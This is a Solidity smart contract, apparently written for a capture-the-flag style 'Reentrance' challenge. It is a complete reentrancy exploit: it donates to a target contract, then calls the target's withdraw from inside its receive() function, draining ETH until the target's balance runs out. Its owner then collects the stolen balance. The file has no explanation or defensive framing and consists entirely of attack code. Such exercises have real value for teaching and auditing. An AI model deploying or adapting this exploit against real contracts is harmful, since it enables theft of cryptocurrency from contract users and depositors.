// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IReentrance {
	function donate(address _to) external payable;
	function withdraw(uint _amount) external;
	function balanceOf(address _who) external view returns (uint balance);
}

/// @title 
contract ReentranceExploit {

	address owner;
	constructor(){
		owner = msg.sender;
	}

	/// @notice this contract will make a donation to a vulnerable contract
	/// @param to the vulnerable contract
	function makeDonation(address payable to) external payable {
		(bool success, ) = to.call{ value: msg.value }(
			abi.encodeWithSignature("donate(address)", address(this))
		);
		require(success);
	}

	function requestWithdraw(address to, uint _amount) external {
		IReentrance vulnerableContract = IReentrance(to);
		vulnerableContract.withdraw(_amount);
	}

	receive() external payable {
		console.log("Exploit received ", msg.value, "wei from ", msg.sender);
		if(msg.sender != owner){
			IReentrance vulnerableContract = IReentrance(msg.sender);
			// contract still have ETH
			if(msg.sender.balance >= msg.value){
				vulnerableContract.withdraw(msg.value);
			}
		}
	}

	function getBalance() view public returns (uint){
		return address(this).balance;
	}

	function withdraw() external {
		require(msg.sender == owner, "not owner");

		(bool success, ) = msg.sender.call{ value: getBalance() }("");
		require(success);
	}

}